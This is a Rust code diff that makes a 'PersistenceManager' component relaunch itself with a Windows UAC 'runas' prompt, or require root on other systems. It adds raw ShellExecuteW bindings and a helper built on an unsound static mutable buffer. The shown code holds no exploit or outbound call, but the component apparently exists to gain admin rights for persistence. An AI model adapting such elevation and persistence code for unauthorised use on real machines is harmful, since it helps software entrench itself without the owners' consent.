@@ -22,22 +22,39 @@ impl PersistenceManager {
     fn ensure_admin() {
         #[cfg(target_os = "windows")]
         {
-            // Check if already admin
             if is_windows_admin() {
                 return;
             }
-            // Try relaunch as admin
-            if let Ok(exe) = std::env::current_exe() {
-                use std::os::windows::process::CommandExt;
-                let _ = std::process::Command::new(exe)
-                    .creation_flags(0x08000000)
-                    .status();
+            // Relaunch with UAC elevation via ShellExecuteW + runas
+            let exe = match std::env::current_exe() {
+                Ok(p) => p,
+                Err(_) => {
+                    std::process::exit(1);
+                }
+            };
+            let exe_wide: Vec<u16> = exe
+                .to_string_lossy()
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
+            unsafe {
+                let result = windows_shell_execute(
+                    std::ptr::null_mut(),
+                    wide("runas"),
+                    exe_wide.as_ptr(),
+                    std::ptr::null(),
+                    std::ptr::null(),
+                    1, // SW_SHOWNORMAL
+                );
+                // result > 32 means success (ShellExecute returns instance handle)
+                if result as isize <= 32 {
+                    eprintln!("[!] Failed to request admin elevation (code: {})", result as isize);
+                }
             }
             std::process::exit(0);
         }
         #[cfg(not(target_os = "windows"))]
         {
-            // Check if root
             let uid = unsafe { libc::getuid() };
             if uid == 0 { return; }
             eprintln!("[!] Must run as root. Exiting.");
@@ -137,7 +154,6 @@ impl PersistenceManager {
 
 #[cfg(target_os = "windows")]
 fn is_windows_admin() -> bool {
-    // Simple check via `net session` — only works for admin
     use std::os::windows::process::CommandExt;
     std::process::Command::new("net")
         .args(["session"])
@@ -147,4 +163,37 @@ fn is_windows_admin() -> bool {
         .status()
         .map(|s| s.success())
         .unwrap_or(false)
+}
+
+#[cfg(target_os = "windows")]
+fn wide(s: &str) -> *const u16 {
+    static mut BUF: Vec<u16> = Vec::new();
+    unsafe {
+        BUF = s.encode_utf16().chain(std::iter::once(0)).collect();
+        BUF.as_ptr()
+    }
+}
+
+#[cfg(target_os = "windows")]
+extern "system" {
+    fn ShellExecuteW(
+        hwnd: *mut std::ffi::c_void,
+        lpOperation: *const u16,
+        lpFile: *const u16,
+        lpParameters: *const u16,
+        lpDirectory: *const u16,
+        nShowCmd: i32,
+    ) -> usize;
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn windows_shell_execute(
+    hwnd: *mut std::ffi::c_void,
+    operation: *const u16,
+    file: *const u16,
+    parameters: *const u16,
+    directory: *const u16,
+    show: i32,
+) -> usize {
+    ShellExecuteW(hwnd, operation, file, parameters, directory, show)
 }
